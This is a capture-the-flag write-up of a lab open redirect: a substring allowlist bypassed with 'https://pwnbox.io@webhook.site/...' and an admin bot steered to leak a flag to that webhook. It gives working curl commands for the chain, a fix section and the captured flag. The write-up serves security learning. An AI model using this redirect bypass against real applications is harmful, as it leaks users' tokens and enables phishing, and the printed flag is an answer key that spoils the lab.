# Hitchhiker Open Redirect Admin Flag Leak

## What Is Happening

The Hitchhiker lab is a small redirector that sends users through `/go?to=...`. The UI says only `pwnbox.io` destinations are allowed, and there is also a "dispatch admin" feature that makes an admin bot visit a submitted same-origin URL.

The redirect check is implemented as a weak substring match. Payloads such as `https://pwnbox.io@webhook.site/UUID` pass validation, but the browser actually navigates to the attacker-controlled host.

## Why It Happens

The validator looks for `pwnbox.io` anywhere in the destination string. It does not normalize or parse the URL before deciding whether the destination is allowed.

That means userinfo confusion works:

```text
Validator sees: pwnbox.io
Browser host:   webhook.site
```

When the admin bot follows the reported same-origin URL, the application redirects outward and appends a sensitive `flag` query parameter to the final destination.

## Exact Test

Confirm blocked external destination:

```bash
curl -sS -G "https://af276312c24c.pwnbox-lab.com/go" \
  --data-urlencode "to=https://example.com"
```

Confirm bypass:

```bash
curl -sS -D - -o /dev/null -G "https://af276312c24c.pwnbox-lab.com/go" \
  --data-urlencode "to=https://pwnbox.io@webhook.site/testuuid123"
```

Report to admin:

```bash
curl -sS -X POST "https://af276312c24c.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://af276312c24c.pwnbox-lab.com/go?to=https%3A%2F%2Fpwnbox.io%40webhook.site%2FYOUR-UUID"}'
```

## Expected Signal

- Plain `https://example.com` returns `That destination is not on the route map.`
- `https://pwnbox.io@webhook.site/...` returns `302` with a Location header containing the attacker host.
- `/api/report` rejects external URLs but accepts same-origin `/go?...` links.
- The admin bot hits the webhook with `?flag=pwnbox{...}`.

## Result Interpretation

Confirmed bug chain:

```text
Weak redirect allowlist
-> userinfo open redirect bypass
-> admin bot visits same-origin /go URL
-> privileged redirect adds flag to outbound URL
```

## Root Cause

Open redirect caused by substring host validation plus unsafe admin redirect side effects.

## Impact

- Force users or bots to attacker-controlled destinations.
- Leak sensitive query data, tokens, or flags through redirect parameters.
- Enable phishing/OAuth chain abuse in real applications.

## Fix

- Parse URLs and compare normalized hostnames against an allowlist.
- Reject credentials/userinfo in redirect targets unless explicitly required.
- Do not append secrets to redirect URLs.
- Sandbox admin bot sessions and destination policies.

## Key Lesson

A visible "allowed host" hint often means substring matching. Test `https://allowed@attacker` early on redirect labs with admin bots.

## Flag

`pwnbox{a4f2e1c8b9d6053a7f1e2b3c4d5e6f78}`
